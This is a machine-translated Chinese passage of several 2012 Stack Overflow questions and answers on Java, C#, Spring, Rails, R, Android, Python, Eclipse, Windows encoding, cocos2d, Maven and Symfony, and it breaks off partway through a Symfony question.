我将该方法拆分为边缘情况，构建在一个足够安全的初始化数组空间（长度）块中，并使用该方法的一部分进行缓冲，每次元素数量等于或大于长度时，该方法的长度加倍。然后，当输入 i 大于数组的项数 (numItems) 以及小于 numItems 时，我设置了方法。i < numItems 工作正常，但是当我尝试放入时

```
insert(63,3)
insert(15,3)
insert(23,3) 
```

在我的`(1,-1,5,23)`阵列中，我在阵列的最后一部分只得到 2 个三。我的初始数组长度是 10，所以这不是内存问题。我认为这可能是打印方法错误并尝试手动获取最后一个元素，这告诉我索引为空。因此，这是我的方法中的一个逻辑错误，如下所示。

```
// if i is greater than the number of items, insert value into numItems index,
// and not any farther. e.g. if i = 100000 and numItems = 10, put value into
// items[10] and not items[100000];
if (i > numItems) 
{
    items[numItems] = value; 
    numItems++; //add to counter
    return;
} 
```

问题是，它是如此简单的代码，我不知道它有什么问题。非常直观，也非常令人费解。想法？

下面是整个插入方法

```
public void insert(int i, double value) //insert value into array[i]
{
    if(i < 0)
    {
        System.out.println("i < 0; please input i >= 0 for array indices."); //an array cannot have an indice < 0;
        return;
    }

    if (numItems >= items.length) // if the number of items becomes equal or greater than the array containing it
    {
        double[] tempItems = new double [items.length * 2]; // create a new array double the size of current
        for(int j =0 ; j < items.length; j++ ) //and copy all elements into the new array
        {
            tempItems[j] = items[j];
        }

        items = tempItems; //set the temp array as the main array.
    }

    if (i > numItems) //if i is greater than the number of items, insert value into numItems index, and not any farther.
    {                 // i.e. if i = 100000 and numItems = 10, put value into items[10] and not items[100000];
        items[numItems] = value; 
        numItems++; //add to counter
        return;
    }

    if ( i < numItems) //if i is inside the used boundaries of the array
    {
        for (int k = numItems; k > i; k--) //shift values over to the right.
        {   
            items[k]=items[k-1];
        }

        items[i] = value; //and insert value into i
        numItems++; //add to counter
        return;
    }

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T23:30:58.260

如果进行任何更改数组大小（插入或删除）的修改，建议使用[`java.util.List`](http://docs.oracle.com/javase/7/docs/api/java/util/List.html)实现。[`ArrayList`](http://docs.oracle.com/javase/7/docs/api/java/util/ArrayList.html)， 例如。它使您免于因临时数组和元素移动而头疼。

此外，要将一些元素从数组复制到数组，您应该考虑使用现有的方法[`System.arraycopy`](http://docs.oracle.com/javase/7/docs/api/java/lang/System.html#arraycopy%28java.lang.Object,%20int,%20java.lang.Object,%20int,%20int%29)，例如[`java.util.Arrays`](http://docs.oracle.com/javase/7/docs/api/java/util/Arrays.html).

# c# - 无法序列化 System.Int32[,] 类型的对象

> ID：12648393
> 
> 赞同：0
> 
> 时间：2012-09-28T22:59:02.290
> 
> 标签：c#, windows

> **可能重复：**
> [使用 XmlSerializer 序列化整数数组](https://stackoverflow.com/questions/553824/serializing-an-array-of-integers-using-xmlserializer)

我正在用 C# 编写我的 Windows 8 应用程序，在尝试序列化我的自定义对象时，我遇到了“存在错误反映类型”错误消息。在查看内部异常时，我发现我们无法序列化多维数组。

我做错了什么还是我是对的？

如果我是对的，有没有办法打包我的 int 类和 int[,] 数组以将它们发送到 romaing 存储？谢谢你。

我正在使用这个 .dll： [http ://winrtstoragehelper.codeplex.com/](http://winrtstoragehelper.codeplex.com/)

这是我的代码：

```
var objectStorageHelper = new ObjectStorageHelper<BaseballTeam>(StorageType.Roaming);
await objectStorageHelper.SaveAsync(team); 
```

以 BaseballTeam 为类型，并以特定对象为团队。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T23:22:05.600

不使用那个库；它使用`XmlSerializer`, 不支持多维数组（参见[http://winrtstoragehelper.codeplex.com/SourceControl/changeset/view/60a57faeb36a#WinRtUtility%2fWinRtUtility%2fObjectStorageHelper.cs](http://winrtstoragehelper.codeplex.com/SourceControl/changeset/view/60a57faeb36a#WinRtUtility%2fWinRtUtility%2fObjectStorageHelper.cs)的源代码）。您仍然可以使用其他一些序列化程序（例如，IIRC JSON.NET 支持多维数组），只需使用 File API 将序列化对象写入漫游存储。

或者选择另一个为您执行此操作的库。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T23:23:17.207

仅在文档中明确提及`DataContractSerializer`（“允许组合集合类型（具有集合的集合）。锯齿状数组被视为集合的集合。不支持多维数组。”参见[Advanced Collection Rules](http://msdn.microsoft.com/en-us/library/aa347850%28v=vs.100%29.aspx)），但多维数组可以' 甚至不会被 XmlSerializer 序列化（即使没有您使用的库，一个简单的测试也会非常清楚地向您展示）。

您可以找到另一个序列化器或简单地转换为锯齿状数组以进行序列化（反序列化时返回多维）。

编辑：之前已经问过一个非常相似的问题，答案对您来说可能是一个很好的解决方法：[使用 XmlSerializer 序列化整数数组](https://stackoverflow.com/questions/553824/serializing-an-array-of-integers-using-xmlserializer)，

# spring - Spring 什么时候在 bean 的生命周期中创建代理？

> ID：12648394
> 
> 赞同：3
> 
> 时间：2012-09-28T22:59:05.077
> 
> 标签：spring

如果我使用 Spring AOP，在 applicationcontext 生命周期代理的哪个时间点创建？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T23:28:12.333

创建 bean 实例后，它们将通过一系列[BeanPostProcessor](http://static.springsource.org/spring/docs/3.1.x/javadoc-api/org/springframework/beans/factory/config/BeanPostProcessor.html)运行- 基于 AOP 建议，代理由名为[AnnotationAwareAspectJAutoProxyCreator的](http://static.springsource.org/spring/docs/3.1.x/javadoc-api/org/springframework/aop/aspectj/annotation/AnnotationAwareAspectJAutoProxyCreator.html)[BeanPostProcessor](http://static.springsource.org/spring/docs/3.1.x/javadoc-api/org/springframework/beans/factory/config/BeanPostProcessor.html)创建（或者可能是它的子类）

# ruby-on-rails - 轨道黄瓜路径.rb

> ID：12648398
> 
> 赞同：0
> 
> 时间：2012-09-28T22:59:29.727
> 
> 标签：ruby-on-rails, ruby, rspec, cucumber

我有这个，当我耙路线时

admin_pdf_templates GET /admin/pdf_templates(.:format) {:controller=>"admin/pdf_templates", :action=>"show"} PUT /admin/pdf_templates(.:format) {:controller=>"admin/pdf_templates" , :action=>"update"} 删除 /admin/pdf_templates(.:format) {:controller=>"admin/pdf_templates", :action=>"destroy"} POST /admin/pdf_templates(.:format) {:controller=>"admin/pdf_templates", :action=>"create"}

在黄瓜的paths.rb中创建动作的路径是什么。

我的paths.rb是/create pdf/ admin_pdf_templates_path(:id => @user.id)

以上路径调用 GET 方法。我如何在黄瓜的 path.rb 中调用 POST 方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T00:03:40.427

您需要描述用户为了发出 post 请求而不是明确发出请求而必须采取的步骤。

例如。

```
Given I am on the new item form
When I fill out the form
Then I should see the new item. 
```

然后，您将定义该 When 步骤

```
fill_in 'Name' :with => 'My Name'
click_button 'Submit' 
```

点击是触发帖子的原因。

如果没有接口来测试这种交互，那么也许你不应该使用 cucumber。

如果您坚持在没有用户触发的情况下发出发布请求，则此主题看起来相似。

[你如何发布到 Capybara 中的 URL？](https://stackoverflow.com/questions/4084212/how-do-you-post-to-a-url-in-capybara)

# wordpress - 如何在 Wordpress 中完全删除 TinyMCE？

> ID：12648402
> 
> 赞同：2
> 
> 时间：2012-09-28T23:00:02.210
> 
> 标签：wordpress, tinymce

当我说“删除”时，我的意思是“永久删除，永远，为所有人”。我想要的只是一个普通的文本框来粘贴 HTML，我在本地编辑。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-29T00:29:20.713

没有什么是真正永久的，因为它是核心的一部分，更新可能会在某个时候重新启用它。

您可以尝试添加`add_filter ( 'user_can_richedit' , create_function ( '$a' , 'return false;' ) , 50 );`到您的 functions.php 文件中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-01T07:31:57.987

您可以将 tinymce 配置参数[模式](http://www.tinymce.com/wiki.php/Configuration%3amode)设置为`none`.

这意味着需要一个特殊的命令来初始化编辑器，因此您的文本区域将保持原样。

# javascript - 此函数在页面加载时运行，但只发生警报 1 和 2——而不是警报 3。什么错误阻止了警报 3 的执行？

> ID：12648403
> 
> 赞同：3
> 
> 时间：2012-09-28T23:00:11.160
> 
> 标签：javascript, sql, xml, ajax, web

当页面加载时，此函数运行，但仅到达警报 2，我怀疑由于上一行中的错误，它没有到达警报 3 `var id_array = xmlDoc.getElementsByTagName("id");`。我曾尝试研究`getElementsByTagName()`我是否正确使用它，但我仍然觉得我是。

```
var xmlhttp;
xmlhttp=new XMLHttpRequest();

xmlhttp.onreadystatechange=function() {
    if (xmlhttp.readyState==4 && xmlhttp.status==200){

        var xmlDoc = xmlhttp.responseXML;
    alert("2");
        var id_array = xmlDoc.getElementsByTagName("id");
    alert("3");
    for(id in id_array)
    {
        // do something with the id 
    }
    }
}
xmlhttp.open("POST", "xmlDoc.xml", true);
xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xmlhttp.send(); 
alert("1"); 
```

这是它应该读取的 xml 文档的示例。实际文件生成 x 数量的“id”，其中包含来自 sql 数据库的不同信息。

```
<id>
    <name><![CDATA[<?php echo $query_array["name"]; ?>]]></name>
    <latitude><![CDATA[<?php echo $query_array["latitude"]; ?>]]></latitude>
    <longitude><![CDATA[<?php echo $query_array["longitude"]; ?>]]></longitude>
    <color><![CDATA[<?php echo $color_array["color_id"]; ?>]]></color>
    <color_r><![CDATA[<?php echo $color_array["red"]; ?>]]></color_r>
    <color_g><![CDATA[<?php echo $color_array["green"]; ?>]]></color_g>
    <color_b><![CDATA[<?php echo $color_array["blue"]; ?>]]></color_b>
    <text><![CDATA[<?php echo $user_array["comment"]; ?>]]></text>
</id>
<id>
    <name><![CDATA[<?php echo $query_array["name"]; ?>]]></name>
    <latitude><![CDATA[<?php echo $query_array["latitude"]; ?>]]></latitude>
    <longitude><![CDATA[<?php echo $query_array["longitude"]; ?>]]></longitude>
    <color><![CDATA[<?php echo $color_array["color_id"]; ?>]]></color>
    <color_r><![CDATA[<?php echo $color_array["red"]; ?>]]></color_r>
    <color_g><![CDATA[<?php echo $color_array["green"]; ?>]]></color_g>
    <color_b><![CDATA[<?php echo $color_array["blue"]; ?>]]></color_b>
    <text><![CDATA[<?php echo $user_array["comment"]; ?>]]></text>
</id>
<id>
    <name><![CDATA[<?php echo $query_array["name"]; ?>]]></name>
    <latitude><![CDATA[<?php echo $query_array["latitude"]; ?>]]></latitude>
    <longitude><![CDATA[<?php echo $query_array["longitude"]; ?>]]></longitude>
    <color><![CDATA[<?php echo $color_array["color_id"]; ?>]]></color>
    <color_r><![CDATA[<?php echo $color_array["red"]; ?>]]></color_r>
    <color_g><![CDATA[<?php echo $color_array["green"]; ?>]]></color_g>
    <color_b><![CDATA[<?php echo $color_array["blue"]; ?>]]></color_b>
    <text><![CDATA[<?php echo $user_array["comment"]; ?>]]></text>
</id> 
```

所以我的预期行为是 id_array （在这个例子中）得到 3 个单元格（每次出现一个），每个单元格都包含标签中的所有数据。

但同样，我怀疑 id_array 分配中的一个错误正在阻止任何事情发生。

任何帮助都会很棒！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T23:20:08.780

放

```
xmlhttp.setRequestHeader('Content-Type',  'text/xml'); 
```

看看是否

```
xmlhttp.responseXML 
```

尝试做时不产生`null`导致错误`.getElementsByTagName("id")`。

# wireshark - Wireshark HTTP 请求

> ID：12648404
> 
> 赞同：1
> 
> 时间：2012-09-28T23:00:14.053
> 
> 标签：wireshark

我正在使用 Wireshark 在我的 Android 上嗅探请求。我看到 Destination 列列出了 IP 地址。如何让 Wireshark 在解析为 IP 地址之前显示人类可读的域名？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-24T13:55:21.607

您应该打开编辑 - 首选项 - 名称解析

启用网络名称解析[√]

或右键单击 IP -> [手动解析地址]

我在 Wireshark 1.8.3 中尝试了这个

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T23:03:59.860

在开始转储之前，您需要在预嗅探选项中选择“解析地址”。

# r - 在 R 中，如何测试两个因素是否相等？

> ID：12648407
> 
> 赞同：4
> 
> 时间：2012-09-28T23:00:57.403
> 
> 标签：r, r-factor, equivalence

我正在生成一个包含不同级别的因素的大列表，并且我希望能够检测其中两个何时定义相同的分区。例如，我想将以下所有内容检测为彼此等效：

```
x1 <- factor(c("a", "a", "b", "b", "c", "c", "a", "a"))
x2 <- factor(c("c", "c", "b", "b", "a", "a", "c", "c"))
x3 <- factor(c("x", "x", "y", "y", "z", "z", "x", "x"))
x4 <- factor(c("a", "a", "b", "b", "c", "c", "a", "a"), levels=c("b", "c", "a")) 
```

做这个的最好方式是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-28T23:23:25.680

我想您想确定双向制表与单向分类具有相同数量的填充级别。中的默认设置`interaction`是表示所有级别，即使未填充但设置 drop=TRUE 会更改它以适合您的目的：

```
> levels (interaction(x1,x2, drop=TRUE) )
[1] "c.a" "b.b" "a.c"
> length(levels(x1) ) == length(levels(interaction(x1,x2,drop=TRUE) ) )
[1] TRUE 
```

概括将着眼于`all( <the 3 necessary logical comparisons> )`：

```
 all( length(levels(x1) ) == length(levels(interaction(x1,x2,drop=TRUE) ) ),
      length(levels(x1) ) == length(levels(interaction(x1,x3,drop=TRUE) ) ),
      length(levels(x1) ) == length(levels(interaction(x1,x4,drop=TRUE) ) ) )
#[1] TRUE 
```

# android - 从非活动类接收意图

> ID：12648408
> 
> 赞同：1
> 
> 时间：2012-09-28T23:00:59.310
> 
> 标签：android, android-context

`ACTION_SEND`是否可以在 Activity 类之外处理 Intent ？

我将收到不打开 Activity 的 Intent，该类创建一个通知以显示正在处理 Intent，而不是打开应用程序。

我确信这可以通过始终运行的服务来实现，但我只希望服务在上面创建通知之前立即运行。（换句话说，`ACTION_SEND`Intent 的处理需要透明而不是呈现 Notification。）

据我所知，这项任务是在非 Activity 类中建立一个 Context 来提供给`getSystemService()`，尽管我不知道如何实现这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T23:05:54.590

如果您只是想避免 UI，那么实际上，扩展`Activity`并不意味着您必须显示任何内容。因此，如果您不需要在您的班级中打开任何 vUI，那么一旦您`onCreate()`被调用，只需像往常一样通过 caling 初始化它`super.onCreate(bundle)`，然后在那里做您想做的事情，但不要调用任何`setContentView()`. 然后在你`onCreate()`跳到另一项活动结束时，或者用`finish()`.

# ruby-on-rails - 用于 Ruby Sequel 或 ORM 检测 SQL 查询以进行慢查询日志分析的工具或补丁

> ID：12648414
> 
> 赞同：3
> 
> 时间：2012-09-28T23:01:29.083
> 
> 标签：ruby-on-rails, ruby, activerecord, sequel, mysql-slow-query-log

我们有来自一套应用程序的 MySQL 慢查询日志，主要是在 Ruby 中，一些使用 Rails ActiveRecord，另一些使用 Sequel。

我们希望能够轻松地将特定（MySQL）慢查询返回到生成它的代码。是否有可以在这些工具中启用的功能，或者可以应用到它们的补丁，它添加嵌入到 SQL 注释中的工具，比如`__FILE__`和`__FUNCTION__`标识符？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-17T01:13:23.683

有趣的问题，这是我将如何处理它...

我会用它`config.active_record.auto_explain_threshold_in_seconds`来[自动解释慢查询](http://weblog.rubyonrails.org/2011/12/6/what-s-new-in-edge-rails-explain/)，就像你正在做的那样。

然后，我将覆盖该`logging_query_plan`方法`ActiveRecord::Explain`以将任何相关数据添加到您的日志中。这是一个添加当前堆栈跟踪的示例：

```
# /config/initializers/add_additional_instumentation_to_explain.rb
module ActiveRecord
  module Explain

    def logging_query_plan # :nodoc:
      return yield unless logger

      threshold = auto_explain_threshold_in_seconds
      current   = Thread.current
      if threshold && current[:available_queries_for_explain].nil?
        begin
          queries = current[:available_queries_for_explain] = []
          start = Time.now
          result = yield
          if Time.now - start > threshold
            # START ADDING ADDITIONAL INFORMATION
            begin
              puts 'ADDING ADDITIONAL INFORMATION...'
              raise 'foo'
            rescue
              puts 'DISPLAYING THE CURRENT STACKTRACE FOR THE FOLLOWING EXPLAIN'
              puts $@
            end

            logger.warn(exec_explain(queries))

          end
          result
        ensure
          current[:available_queries_for_explain] = nil
        end
      else
        yield
      end
    end

  end
end 
```

我更喜欢一种不依赖于 rails 的整个修改方法的方法，但这是我可以让它可靠地工作的唯一方法。

对于它的价值，这将很容易分拆成一个 gem，每个 rails 版本都有一个新的，并且只需为每个应用程序包含您的版本的相关 gem，因为听起来您可能支持多个版本铁轨。这将有助于最小化所述方法的一些脆弱性。无论如何，希望这会有所帮助 - 祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T14:30:25.490

我强烈推荐 rack-mini-profiler 来帮助快速了解你的 Rails（或其他基于机架的）应用程序是如何花费时间的。它特别擅长显示哪些 Ruby 代码生成了哪些 SQL 语句。访问下面的所有三个链接以学习如何使用它。祝你好运。

[http://miniprofiler.com/](http://miniprofiler.com/)

[http://railscasts.com/episodes/368-miniprofiler](http://railscasts.com/episodes/368-miniprofiler)

[http://samsaffron.com/archive/2012/07/12/miniprofiler-ruby-edition](http://samsaffron.com/archive/2012/07/12/miniprofiler-ruby-edition)

# eclipse - 如何在 Eclipse (CDT) 的大纲视图中进行全面搜索

> ID：12648417
> 
> 赞同：5
> 
> 时间：2012-09-28T23:01:41.837
> 
> 标签：eclipse, eclipse-cdt

我在工作中使用 Eclipse CDT 进行 C 代码浏览。很多时候我喜欢搜索一个我真的不知道名字的函数名。

好的部分是有一个可用的搜索，只要我开始在大纲窗口中用光标输入，它就会开始寻找匹配项。

但是，问题是我的猜测必须与函数名的开头相匹配。

即我可以通过键入get_var_xyz() 找到get_var_xyz()，或者通过键入get_var 缩小到get_var_xyz 和get_var_abc。

如果我不知道前面的文字是什么，我不能简单地搜索 xyz。这就是我希望能够做到的。

有没有隐藏在某个地方的设置？还是我可以安装的插件？

或者，它甚至不必通过 Outline。只要我能说“在当前文件中，显示所有包含此文本的函数”

提前致谢！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-15T23:05:17.517

所以我找到了这个。如果您执行“Ctrl+O”，它会弹出一个称为快速大纲的小窗口。在此我可以在搜索时使用通配符 (*)，这非常有用！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-29T00:05:52.380

您可以尝试从主菜单中导航-> 打开元素。该对话框支持通配符，具有丰富的过滤功能并且可以跨多个文件工作。如果我需要在单个文件中查找某些内容，我通常使用增量查找 (Ctrl+J)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-03-04T14:35:58.990

对于复杂文件，`"*"`在快速大纲对话框中崩溃。一种解决方法是先键入，然后导航到开头并插入一个`"*"`. 它对我有用，丑陋:(

# ruby-on-rails - has_many through 的嵌套成员的 Rails 助手路由不正确

> ID：12648420
> 
> 赞同：0
> 
> 时间：2012-09-28T23:02:13.450
> 
> 标签：ruby-on-rails, ruby-on-rails-3, routes, has-many-through

我有一个 has_many :through 关系，其中提要 has_many 列表。

路线

```
resources :feeds do
  member do 
    resources :feed_lists
  end
end 
```

我想打的路线：

```
feed_list
   DELETE /feeds/:id/feed_lists/:id(.:format)   feed_lists#destroy 
```

然后当循环通过@feed.lists 我得到不正确的路径：

```
feed_list_path(list, @feed) = "/feeds/41/feed_lists/41"
feed_list_path(@feed, list) = "/feeds/5/feed_lists/5"
feed_list_path [@feed, list] = "/feeds/41/5/feed_lists/41/5 
```

显然我想要的是

```
feed_list_path(list, @feed) = "/feeds/41/feed_lists/5" 
```

这对于 has_many :through 关系是不可能的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T23:53:11.957

您的路线应该看起来更像这样：

```
resources :feeds do
  resources :lists
end 
```

这是一个路由问题的线索是在生成的路由中；两个参数都被调用`id`，所以相同的值被放入 URL 两次。正确生成的路由应该是`feeds/:feed_id/lists/:id`（注意不同的参数：`feed_id`和`id`）。

您现在应该能够：

```
feed_list_path(list, @feed)  # => "/feeds/41/lists/5"
feed_list_url(list, @feed)   # => "http://yoursite/feeds/41/lists/5"
url_for [@feed, list]        # => "http://yoursite/feeds/41/lists/5" 
```

有关详细信息，请参阅[Rails 路由指南](http://guides.rubyonrails.org/routing.html)。

# python - 你如何保护自己免受python垂直字符串列表中缺少逗号的影响？

> ID：12648424
> 
> 赞同：9
> 
> 时间：2012-09-28T23:02:56.670
> 
> 标签：python

在 python 中，具有垂直方向的字符串列表是很常见的。例如：

```
subprocess.check_output( [
  'application',
  '-first-flag',
  '-second-flag',
  '-some-additional-flag'
] ) 
```

这看起来不错，可读，不违反 80 列规则...但是如果缺少逗号，如下所示：

```
subprocess.check_output( [
  'application',
  '-first-flag'  # missed comma here
  '-second-flag',
  '-some-additional-flag'
] ) 
```

Python 仍然会通过连接两个 stings 来假定此代码有效:(。是否有可能以某种方式保护自己免受此类拼写错误的影响，同时仍然使用垂直方向的字符串列表并且没有臃肿的代码（比如将每个项目封装在里面`str()`）？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-28T23:12:29.937

您可以在空格后的行尾添加逗号，如下所示：

```
subprocess.check_output( [
   'application'           ,
   '-first-flag'           ,
   '-second-flag'          ,
   '-some-additional-flag' ,
] ) 
```

这样做看起来有点糟糕，但如果你遗漏了任何论点，很容易发现。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-29T17:51:24.497

您可以将每个字符串包装在括号中：

```
subprocess.check_output( [
  ('application'),
  ('-first-flag'),
  ('-second-flag'),
  ('-some-additional-flag'),
] ) 
```

顺便说一句，Python 可以使用尾随逗号，所以总是在行尾使用逗号，这也应该减少错误。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-28T23:44:31.930

也许对于*这种*特殊情况：

```
arglist = 'application -first-flag -second-flag -some-additional-flag'
arglist = arglist.split()
subprocess.check_output(arglist) 
```

或者，如果您发现自己编写了许多这样的唯一列表，请创建一个将行连接成列表形式的宏，这样您就可以避免手动放置逗号。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-04-20T21:50:49.523

这是另一种选择：

```
subprocess.check_output('''
application
-first-flag
-second-flag
-some-additional-flag
'''.split()) 
```

让 Python 为您插​​入逗号，这对于配置文件中的长字符串列表特别有用

# windows - 具有特殊字符的 Windows 文件夹，如何循环处理它们

> ID：12648430
> 
> 赞同：0
> 
> 时间：2012-09-28T23:04:31.970
> 
> 标签：windows, batch-file, character, special-characters, directory

我有这个共享文件夹，

```
\\FILE48\BUGB-MONTR‚AL_RŠGLEMENTS_GESTIONNAIRES 
```

激活 chcp 1252 后

```
\\FILE48\BUGB-MONTRéAL_RèGLEMENTS_GESTIONNAIRES 
```

我想创建一个脚本，它应该能够读取包含该文件夹并处理它的文件。目前我无法解决这个问题，

例如我有一个文件：file1.txt

```
\\FILE48\BUGB-MONTR‚AL_RŠGLEMENTS_GESTIONNAIRES 
```

在 (file1.txt) 中执行 for /f %%i do diruse %%i 不起作用。

我的脚本的输出试图到达 \FILE48\bugb-Montrâ€šal_RÅ glements_Gestionnaires

不知道为什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T23:43:59.473

进入命令窗口的属性并将字体更改为“Lucida Console”。然后将 chcp 更改为 1252。这应该会为您提供正确的字符。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-02T15:02:01.937

我最终使用了： iconv -f utf-8 -t Windows-1252 <输入>输出在此文本之后，字符串开始正常工作。

# ios - iOS 图形问题

> ID：12648443
> 
> 赞同：2
> 
> 时间：2012-09-28T23:06:20.210
> 
> 标签：ios, graphics, cocos2d-iphone

所以我正在创建一个横向滚动射击游戏，但偶尔会遇到一些图形问题。我遇到了这条出现的神秘线。正如您在下图中看到的那样，它出现在一些但不是所有的精灵上。我该如何解决这个问题？这是我的还是艺术家的错误？

我正在使用 Cocos2d 开发并使用 CCSpriteBatchNode，我的精灵表是 .png，不确定信息是否相关，只是想我会留下尽可能多的信息。

有任何想法吗？？？

![白线图形问题？](../Images/0f4e560835204bf9b8fba039836ee20c.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-29T03:58:20.950

我也在我的一个 cocos2D 游戏中观察到了同样的事情。我通过做两件事解决了这个问题。

一：
在ccConfig.h中定义这个

```
#ifndef CC_FIX_ARTIFACTS_BY_STRECHING_TEXEL
#define CC_FIX_ARTIFACTS_BY_STRECHING_TEXEL 1
#endif 
```

第二：

> 检查您的 spriteSheet，在 sprite Spacing 中使用 2 像素间隙。（我使用 Zwoptex）有一个选项。

我相信第一个肯定会解决您的问题..快乐编码。

# java - Maven 插件：以编程方式查询 Maven 存储库

> ID：12648444
> 
> 赞同：0
> 
> 时间：2012-09-28T23:06:22.213
> 
> 标签：java, maven, plugins

**问题**：如何让我的自定义 maven 插件以编程方式查询和获取 maven 存储库中的非标准 maven 文件，例如与 pom、jar 等一起上传的 xml 文件？

**背景信息**：我正在编写一个 maven 插件，它根据 pom 文件中的依赖项为项目创建 feature.xml 文件。我知道 feature-maven-plugin 已经存在，但我正在尝试做更多的事情，例如检查一个依赖项是否在存储库中有一个“feature.xml”，以及它是否下载它并将其包含到新项目的 feature.xml 中. 我不确定从哪里开始，任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T00:14:47.843

如果您将其表示为依赖项，它将仅存在于依赖项中。

否则，您必须调用工件解析器来解决它。解决此类问题的方法是找到一个存在相同问题的现有插件并阅读其源代码。

例如，阅读 对和`maven-eclipse-plugin`的支持。`downloadSources``downloadJavadoc`

# symfony - Symfony2 - 在 prod 环境中找不到类

> ID：12648446
> 
> 赞同：8
> 
> 时间：2012-09-28T23:06:50.677
> 
> 标签：symfony, production-environment, classnotfoundexception, fatal-error

我正在 Symfony 2.1 中创建新项目。我想检查我的应用程序是否会在我的服务器上正常运行，所以我复制了所有文件，清除了缓存并设置了权限。**在本地开发环境中一切正常**，但是当我在服务器上请求“在线 - 产品”版本时出现错误：

```
Fatal error: Class 'Doctrine\Bundle\FixturesBundle\DoctrineFixturesBundle' not found in /www/gastlich_www/www/livescore.gastlich.iq.pl/app/AppKernel.php on line 25 
```

我发现了一些关于这个问题的信息，但它们都与将命名空间从 Symfony\Bundle 更改为 Doctrine\Bundle 和 Symfony 2.0 相关。

所以我检查了我的 AppKernel.php 文件，我的包路径是正确的。

我的 composer.json 看起来像：

```
{
"name": "symfony/framework-standard-edition",
"description": "The \"Symfony Standard Edition\" distribution",
"autoload": {
    "psr-0": { "": "src/" }
},
"require": {
    "php": ">=5.3.3",
    "symfony/symfony": "2.1.*",
    "doctrine/orm": ">=2.2.3,<2.4-dev",
    "doctrine/doctrine-bundle": "1.0.*",
    "twig/extensions": "1.0.*",
    "symfony/assetic-bundle": "2.1.*",
    "symfony/swiftmailer-bundle": "2.1.*",
    "symfony/monolog-bundle": "2.1.*",
    "sensio/distribution-bundle": "2.1.*",
    "sensio/framework-extra-bundle": "2.1.*",
    "sensio/generator-bundle": "2.1.*",
    "jms/security-extra-bundle": "1.2.*",
    "jms/di-extra-bundle": "1.1.*",
    "stof/doctrine-extensions-bundle": "dev-master",
    "doctrine/doctrine-fixtures-bundle": "dev-master"
},
"scripts": {
    "post-install-cmd": [
        "Sensio\\Bundle\\DistributionBundle\\Composer\\ScriptHandler::buildBootstrap",
        "Sensio\\Bundle\\DistributionBundle\\Composer\\ScriptHandler::clearCache",
        "Sensio\\Bundle\\DistributionBundle\\Composer\\ScriptHandler::installAssets",
        "Sensio\\Bundle\\DistributionBundle\\Composer\\ScriptHandler::installRequirementsFile"
    ],
    "post-update-cmd": [
        "Sensio\\Bundle\\DistributionBundle\\Composer\\ScriptHandler::buildBootstrap",
        "Sensio\\Bundle\\DistributionBundle\\Composer\\ScriptHandler::clearCache",
        "Sensio\\Bundle\\DistributionBundle\\Composer\\ScriptHandler::installAssets",
        "Sensio\\Bundle\\DistributionBundle\\Composer\\ScriptHandler::installRequirementsFile"
    ]
},
"minimum-stability": "dev",
"extra": {
    "symfony-app-dir": "app",
    "symfony-web-dir": "web"
} 
```

}

和 AppKernel.php 配置：

```
<?php

use Symfony\Component\HttpKernel\Kernel;
use Symfony\Component\Config\Loader\LoaderInterface;

class AppKernel extends Kernel
{
    public function registerBundles()
    {
        $bundles = array(
            new Symfony\Bundle\FrameworkBundle\FrameworkBundle(),
            new Symfony\Bundle\SecurityBundle\SecurityBundle(),
            new Symfony\Bundle\TwigBundle\TwigBundle(),
            new Symfony\Bundle\MonologBundle\MonologBundle(),
            new Symfony\Bundle\SwiftmailerBundle\SwiftmailerBundle(),
            new Symfony\Bundle\AsseticBundle\AsseticBundle(),
            new Doctrine\Bundle\DoctrineBundle\DoctrineBundle(),
            new Sensio\Bundle\FrameworkExtraBundle\SensioFrameworkExtraBundle(),
            new JMS\AopBundle\JMSAopBundle(),
            new JMS\DiExtraBundle\JMSDiExtraBundle($this),
            new JMS\SecurityExtraBundle\JMSSecurityExtraBundle(),
            new Acme\StoreBundle\AcmeStoreBundle(),
            new Livescore\StatsBundle\LivescoreStatsBundle(),
            new Stof\DoctrineExtensionsBundle\StofDoctrineExtensionsBundle(),
            new Doctrine\Bundle\FixturesBundle\DoctrineFixturesBundle()
        );

        if (in_array($this->getEnvironment(), array('dev', 'test'))) {
            $bundles[] = new Symfony\Bundle\WebProfilerBundle\WebProfilerBundle();
            $bundles[] = new Sensio\Bundle\DistributionBundle\SensioDistributionBundle();
            $bundles[] = new Sensio\Bundle\GeneratorBundle\SensioGeneratorBundle();
        }

        return $bundles;
    }

    public function registerContainerConfiguration(LoaderInterface $loader)
    {
        $loader->load(__DIR__.'/config/config_'.$this->getEnvironment().'.yml');
    }
} 
```

我试图找出问题出在哪里，所以我在 AppKernel.php 中删除了这个包，然后我得到了下一个致命错误：

```
